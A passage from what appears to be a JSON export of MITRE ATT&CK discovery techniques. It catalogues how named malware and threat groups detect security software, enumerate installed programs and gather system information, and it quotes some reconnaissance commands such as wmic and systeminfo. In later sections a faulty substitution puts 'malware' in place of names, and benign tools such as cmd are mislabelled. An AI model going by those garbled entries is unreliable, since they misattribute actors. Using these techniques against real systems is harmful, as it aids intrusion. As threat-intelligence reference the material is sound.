                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used scripts to detect security software.[77]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can enumerate AWS security services, including WAF rules and GuardDuty detectors.[78]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> scanned the \"Program Files\" directories for a directory with the string \"Total Security\" (the installation path of the \"360 Total Security\" antivirus tool).[79]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> can check for the presence of ESET and Kaspersky security software.[80]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has detected security tools.[81]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> may collect information on the victim's anti-virus software.[82]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "A module in <name> collects information from the victim about installed anti-virus software.[83]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> can gather AVs registered in the system.[84]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can identify the installed antivirus product on a targeted system.[85][86][86][87]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> has a plugin detect security products via active drivers.[88]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> used scripts which detected and uninstalled antivirus software.[89][90]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> enumerates running processes to search for Wireshark and Windows Sysinternals suite.[91][92]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can obtain information about security software on the victim.[93]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> uses a loader DLL file to collect AV product names from an infected host.[2]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used the Windows service winmgmts:\\.\\root\\SecurityCenter2 to check installed antivirus products.[94]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can determine if an anti-virus product is installed through the resolution of the service's virtual SID.[95]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has the ability to check if /usr/sbin/setenforce exists. This file controls what mode SELinux is in.[96]"
                    },
                    "S0646": {
                        "ID": "S0646",
                        "Name": "SpicyOmelette",
                        "Description": "<name> can check for the presence of 29 different antivirus tools.[97]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> can check for antivirus and antimalware programs.[98]"
                    },
                    "S0142": {
                        "ID": "S0142",
                        "Name": "StreamEx",
                        "Description": "<name> has the ability to scan for security tools such as firewalls and antivirus tools.[99]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can identify if ESET or BitDefender antivirus are installed before dropping its payload.[100]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> enumerates the currently running processes related to a variety of security products.[101]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> checked for a variety of antivirus/endpoint detection agents prior to execution.[102][103]"
                    },
                    "S0098": {
                        "ID": "S0098",
                        "Name": "T9000",
                        "Description": "<name> performs checks for various antivirus and security products during installation.[104]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used tools to search victim systems for security products such as antivirus and firewall software.[105]"
                    },
                    "S0467": {
                        "ID": "S0467",
                        "Name": "TajMahal",
                        "Description": "<name> has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.[106]"
                    },
                    "S0057": {
                        "ID": "S0057",
                        "Name": "Tasklist",
                        "Description": "<name> can be used to enumerate security software currently running on a system by process name of known products.[107]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has searched for security products on infected machines.[108][109]"
                    },
                    "G0089": {
                        "ID": "G0089",
                        "Name": "The White Company",
                        "Description": "<name> has checked for specific antivirus products on the target\u2019s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.[110]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> uses the kill_unwanted function to get a list of running processes, compares each process with an encrypted list of \"unwanted\" security related programs, and kills the processes for security related programs.[111]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> can determine is Kaspersky software is running on an endpoint by running cmd /c wmic process where name=\"avp.exe\".[112]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> can search for anti-virus software running on the system.[113]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has obtained information on security software, including security logging information that may indicate whether their malware has been detected.[114]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can determine if a compromised host has security products installed.[115]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> uses WMI to check for anti-virus software installed on the system.[116]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> can find the presence of a specific security software.[117]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can recognize the presence of monitoring tools on a target system.[118]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used malware to identify installed AV and commonly used forensic and malware analysis tools.[119]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> checks for the presence of Bitdefender security software.[120]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used WMI to identify anti-virus products installed on a victim's machine.[121]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can detect Avast Software, Doctor Web, Kaspersky, AVG, ESET, and Sophos antivirus programs.[122]"
                    },
                    "S0653": {
                        "ID": "S0653",
                        "Name": "xCaon",
                        "Description": "<name> has checked for the existence of Kaspersky antivirus software on the system.[123]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> searches firewall configuration files located in /Library/Preferences/ and uses csrutil status to determine if System Integrity Protection is enabled.[124]"
                    },
                    "S0388": {
                        "ID": "S0388",
                        "Name": "YAHOYAH",
                        "Description": "<name> checks for antimalware solution processes on the system.[125]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim\u2019s environment.[126][127]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> can search a compromised host to determine if it is running Windows Defender or Kasperky antivirus.[128]"
                    }
                }
            }
        },
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Such software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
        "Procedure": {
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can query the Registry for installed applications.[1]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has used tools to enumerate software installed on an infected host.[2]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware has the ability to enumerate what browser is being used as well as version information for Safari.[3]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can list the installed applications on a compromised host.[4]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "The malware System Profiler can discover applications through the browser and identify the version of Java the target has.[5]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware can check the victim's default browser to determine which process to inject its communications module into.[6]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to gather information on installed applications.[2]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware has collected a list of installed software on the system.[7]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware lists all installed software for the infected machine.[8]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to identify installed programs on a compromised host.[9]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has enumerated programs installed on an infected machine.[10]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware can retrieve a list of applications from the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths registry key.[11]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has enumerated installed software on compromised systems.[12]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can collect information about installed software used by specific users, software executed on user login, and software executed by each system.[13][14]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can collect information on installed applications.[15]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can check for the Telegram installation directory by enumerating the files on disk.[16]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has searched the compromised system for banking applications.[17][18]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used a PowerShell backdoor to check for Skype connectivity on the target machine.[19]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has searched the victim system for the InstallUtil.exe program and its version.[20]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "During malware, the threat actors deployed a file called DeployJava.js to fingerprint installed software on a victim system prior to exploit delivery.[21]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors collected a list of installed software on the infected system.[22]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can gather the victim's Internet Explorer version.[23]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware can list PHP server configuration details.[24]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can enumerate a list of installed programs.[25]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can scan victim drives to look for specific banking software on the machine to determine next actions.[26]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can check for the presence and version of the .NET framework.[27]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware gathered a list of installed software on the infected host.[28]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has collected browser information from a compromised host.[29]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to enumerate software installed on an infected host.[30][31]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware searches for the kubectl binary.[32]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can identify the victim's browser in order to serve the correct fake update page.[33]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware can enumerate running software on a targeted system.[34]"
            },
            "S1042": {
                "ID": "S1042",
                "Name": "SUGARDUMP",
                "Description": "malware can identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host.[35]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can collect a list of installed software from an infected host.[36]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to identify the Internet Explorer (IE) version on an infected host.[37]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware's backdoor could list the infected system's installed software.[38]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has queried the Registry on compromised systems for information on installed software.[39]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has used a script to detect installed software on targeted systems.[40]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used malware to identify installed software.[41]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine.[42]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can collect .NET, PowerShell, and Python information from an infected host.[43]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware uses ps aux with the grep command to enumerate common browsers and system processes potentially impacting malware's exfiltration capabilities.[44]"
            }
        }
    },
    "T1082": {
        "ttp_name": "System Information Discovery",
        "ttp_id": "T1082",
        "href": "/techniques/T1082",
        "tactic": "Discovery",
        "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version).[1] System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.[2][3]Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[4][5][6]",
        "Procedure": {
            "S0065": {
                "ID": "S0065",
                "Name": "4H RAT",
                "Description": "malware sends an OS version identifier in its beacons.[7]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware has the ability to collect the hostname, OS version, and OS architecture of an infected host.[8]"
            },
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download[9]"
            },
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware can run Systeminfo to gather information about the victim.[10][11]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.[12][13][14]"
            },
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware uses the GetSystemInfo Windows function to determine the number of processors on a victim machine.[15]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has collected the computer name and OS version from a compromised machine.[16][17]"
            },
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware can determine the hostname and linux version on a compromised host.[18]"
            },
            "S0584": {
                "ID": "S0584",
                "Name": "AppleJeus",
                "Description": "malware has collected the victim host information after infection.[19]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can identify the OS version of a targeted system.[20]"
            },
            "G0026": {
                "ID": "G0026",
                "Name": "APT18",
                "Description": "malware can collect system information from the victim\u2019s machine.[21]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware collected system architecture information. malware used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim\u2019s machine.[22][23]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can obtain information about the local system.[24][25]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. malware executed shellcode to identify the name of the infected host.[26][27][28][29]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware collects the computer name, the BIOS model, and execution path.[30]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.[31]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information.[32]"
            },
            "G0143": {
                "ID": "G0143",
                "Name": "Aquatic Panda",
                "Description": "malware has used native OS commands to understand privilege levels and system details.[33]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.[34]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware collects the machine name and keyboard language from the system. [35][36]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can check the disk size through the values obtained with DeviceInfo.[37]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware monitors the free disk space on the system.[38]"
            },
            "S1029": {
                "ID": "S1029",
                "Name": "AuTo Stealer",
                "Description": "malware has the ability to collect the hostname and OS information from an infected host.[8]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to identify the host volume ID and the OS architecture on a compromised host.[39]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.[40][41]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can enumerate disk volumes, get disk information, and query service status.[42]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has executed the ver command.[43]"
            },
            "S0475": {
                "ID": "S0475",
                "Name": "BackConfig",
                "Description": "malware has the ability to gather the victim's computer name.[44]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware collects information about the OS and computer name.[45][46]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "During its initial execution, malware extracts operating system information from the infected host.[47]"
            },
            "S0245": {
                "ID": "S0245",
                "Name": "BADCALL",
                "Description": "malware collects the computer name and host name on the compromised system.[48]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware has captured victim computer name, memory space, and CPU details.[49]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can obtain current system information from a compromised machine such as the SHELL PID, PSVERSION, HOSTNAME, LOGONSERVER, LASTBOOTUP, drive information, OS type/version, bitness, and hostname.[50][51]"
            },
            "S0337": {
                "ID": "S0337",
                "Name": "BadPatch",
                "Description": "malware collects the OS system, OS version, MAC address, and the computer name from the victim\u2019s machine.[52]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can collect information about the drives available on the system.[53]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware gathers system information, network addresses, disk type, disk free space, and the operation system version.[54][55]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can fingerprint architecture, computer name, and OS version on the compromised host. malware can also check if the Russian language is installed on the infected machine and terminate if it is found.[56][57]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to collect the processor type, operation system, computer name, and whether the system is a laptop or PC.[58]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has used commands and API calls to gather system information.[59][60][61]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can enumerate volumes and collect system boot configuration and CPU information.[62][63]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can obtain the computer name and UUID, and enumerate local drives.[64]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.[65][66]"
            },
            "S0564": {
                "ID": "S0564",
                "Name": "BlackMould",
                "Description": "malware can enumerate local drives on a compromised host.[67]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.[68]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has collected hardware details for the victim's system, including CPU and memory information.[69]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware has collected the computer name and OS version from victim machines.[70]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware has discovered the OS version, CPU model, and RAM size of the system it has been installed on.[71]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can enumerate the hostname, domain, and IP of a compromised host.[72]"
            },
            "S0252": {
                "ID": "S0252",
                "Name": "Brave Prince",
                "Description": "malware collects hard drive content and system configuration information.[73]"
            },
            "S0043": {
                "ID": "S0043",
                "Name": "BUBBLEWRAP",
                "Description": "malware collects system information, including the operating system version and hostname.[9]"
            },
            "S0471": {
                "ID": "S0471",
                "Name": "build_downer",
                "Description": "malware has the ability to send system volume information to C2.[39]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can enumerate the OS version and domain on a targeted system.[74][75][76]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.[77][3]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems.[78]"
            },
            "S0693": {
                "ID": "S0693",
                "Name": "CaddyWiper",
                "Description": "malware can use DsRoleGetPrimaryDomainInformation to determine the role of the infected machine. malware can also halt execution if the compromised host is identified as a domain controller.[79][80]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to discover information about the compromised host.[81]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can gather system information from the victim\u2019s machine such as the OS version, machine name, and drive information.[82][83]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has collected the operating system version from the infected system.[84]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.[85]"
            },
            "S0462": {
                "ID": "S0462",
                "Name": "CARROTBAT",
                "Description": "malware has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.[86][87]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more.[88]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has collected system information, including the machine name and OS version.[89]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can enumerate the OS version and computer name on a targeted system.[90]"
            },
            "S0144": {
                "ID": "S0144",
                "Name": "ChChes",
                "Description": "malware collects the victim hostname, window resolution, and Microsoft Windows version.[91][92]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information.[93]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware has the ability to list drives and obtain the computer name of a compromised host.[94]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can discover the hostname, computer name, and Windows version of a targeted machine.[95][96]"
            },
            "S0106": {
                "ID": "S0106",
                "Name": "cmd",
                "Description": "malware can be used to find information about the operating system.[97]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware collects the hostname of the victim machine.[98]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has used a file stealer that can examine system drives, including those other than the C drive.[99]"
            },
            "S0137": {
                "ID": "S0137",
                "Name": "CORESHELL",
                "Description": "malware collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.[100]"
            },
            "S0046": {
                "ID": "S0046",
                "Name": "CozyCar",
                "Description": "A system info module in malware gathers information on the victim host\u2019s configuration.[101]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can enumerate the system drives and associated system name.[102]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a command to collect the victim PC name, disk drive information, and operating system.[103][104][105]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can enumerate local drives, disk type, and disk free space.[106]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.[107]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware has the ability to query device information.[108]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can collect the computer name, RAM used, and operating system version from the victim\u2019s machine.[109][110]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses the Delphi methods Sysutils::DiskSize and GlobalMemoryStatusEx to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment.[111] malware will gather various system information such as display adapter description, operating system type and version, processor type, and RAM amount.[111]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has collected the hostname, OS version, service pack version, and the processor architecture from the victim\u2019s machine.[112][113]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can obtain system information by querying the Win32_ComputerSystem, Win32_BIOS, Win32_MotherboardDevice, Win32_PnPEntity, and Win32_DiskDrive WMI objects.[114]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can collect the OS version, system architecture, and computer name.[115]"
            },
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware can enumerate a victim computer's volume serial number and host name.[78]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware can enumerate logical drives on a target system.[116]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware collects OS information and the computer name from the victim\u2019s machine.[117][118]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.[119]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can collect the computer name and OS version from the system.[120]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to identify the system volume information of a compromised host.[39]"
            },
            "S0186": {
                "ID": "S0186",
                "Name": "DownPaper",
                "Description": "malware collects the victim host name and serial number, and then sends the information to the C2 server.[121]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware has collected the computer name and OS architecture information from the system.[122]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware has checked for the presence of Arabic language in the infected machine's settings.[123]"
            },
            "S0105": {
                "ID": "S0105",
                "Name": "dsquery",
                "Description": "malware has the ability to enumerate various information, such as the operating system and host name, for systems within a domain.[78]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can collect the victim's computer name, hostname and adapter information to create a unique identifier.[124][125]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware extracts basic information about the operating system.[126]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.[127]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware can perform a language check of the infected system and can query the CPU information (cupid).[128][129]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "malware executes systeminfo after initial communication is made to the remote server.[130]"
            },
            "S0082": {
                "ID": "S0082",
                "Name": "Emissary",
                "Description": "malware has the capability to execute ver and systeminfo commands.[131]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can enumerate host system information like OS, architecture, domain name, applied patches, and more.[132][133]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware can determine whether the ISO payload was received by a Windows or iOS device.[72]"
            },
            "S0091": {
